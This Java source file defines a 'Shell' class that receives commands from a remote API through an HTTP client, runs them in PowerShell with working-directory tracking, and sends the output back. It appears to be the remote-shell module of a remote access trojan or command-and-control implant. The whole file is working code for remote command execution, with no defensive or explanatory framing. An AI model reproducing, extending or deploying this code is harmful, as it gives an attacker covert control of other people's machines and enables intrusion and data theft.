package modules.auxiliary;

import modules.net.ShellHttpClient;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.util.concurrent.TimeUnit;

/**
    Provides functionality for receiving, executing commands from the API and sending back the results.

    @author Str1k3r
    @version 1.0
 */
public class Shell {

    private static Shell instance;
    private final ProcessBuilder processBuilder;
    private ShellHttpClient shellHttpClient;

    private Shell() {
        shellHttpClient = ShellHttpClient.getInstance();
        processBuilder = new ProcessBuilder();
        processBuilder.directory(new File(".")); // initialise cwd
    }

    public static Shell getInstance() {
        if(instance == null) {
            instance = new Shell();
        }

        return instance;
    }

    public void exec(String cmdString) {
        try {
            cmdString = cmdString.trim();
            String cmd = cmdString.substring(0, (cmdString.contains(" "))?cmdString.indexOf(" "):cmdString.length());

            if(cmd.equalsIgnoreCase("cd") || cmd.equalsIgnoreCase("chdir")) {
                String directory = cmdString.substring(cmdString.indexOf(" ")+1); // index will offset to 0 if -1 returned by indexOF()

                if(directory.isBlank() || cmd.length() == cmdString.length()) {
                    // blank directory OR cmd is only "cd" no directory arg provided
                    shellHttpClient.sendCmdResult(processBuilder.directory().getAbsolutePath()); // send cwd
                    return;

                }
                changeDir(directory);
                return;
            }


            processBuilder.command("powershell", "/c", cmdString);
            processBuilder.redirectErrorStream(true); // combine normal output with error output
            Process process = processBuilder.start();

            if(process.waitFor(300, TimeUnit.SECONDS)) {
                try(DataInputStream inStream = new DataInputStream(new BufferedInputStream(process.getInputStream()))) {

                    byte[] data = new byte[inStream.available()];
                    int bytesRead = 0;
                    while (inStream.available() > 0) {
                        bytesRead += inStream.read(data, bytesRead, data.length); // read all cmd output bytes
                    }

                    String cmdOut = new String(data); // convert to readable format
                    shellHttpClient.sendCmdResult(cmdOut); // send through
                }
            }
            else {
                shellHttpClient.sendCmdResult("Process delayed in executing command.");
            }
        }
        catch (Exception ioEx) {
            // User should try executing cmd again, prompted by no result returned
            shellHttpClient.sendCmdResult("Error while executing command. Try again.");
        }

    }

    private void changeDir(String directory) {

        try {
            directory = directory.trim();
            if(directory.equals("..")) {
                String cwd = processBuilder.directory().getAbsolutePath();

                File parent = new File(cwd).getParentFile();
                if(parent == null) {
                    return; // volume root has no parent
                }
                directory = parent.getAbsolutePath();
            }
            else {
                if(!new File(directory).exists()) {

                    // relative path provided, so make absolute
                    String absolutePath = String.valueOf(Path.of(processBuilder.directory().getAbsolutePath(), directory));
                    if(! new File(absolutePath).exists()) {
                        shellHttpClient.sendCmdResult(String.format("No such directory '%s'", directory));
                        return;
                    }

                    directory = absolutePath;
                }
            }

            File newDirectory = new File(directory);
            if(newDirectory.isFile()) {
                shellHttpClient.sendCmdResult(String.format("'%s' is not a directory.", directory));
                return;
            }

            processBuilder.directory(newDirectory);
            shellHttpClient.sendCmdResult(processBuilder.directory().getAbsolutePath());
        }
        catch(Exception ex) {
            shellHttpClient.sendCmdResult(String.format("Unexpected error while changing directory. %s", ex.getMessage()));
        }
    }
}
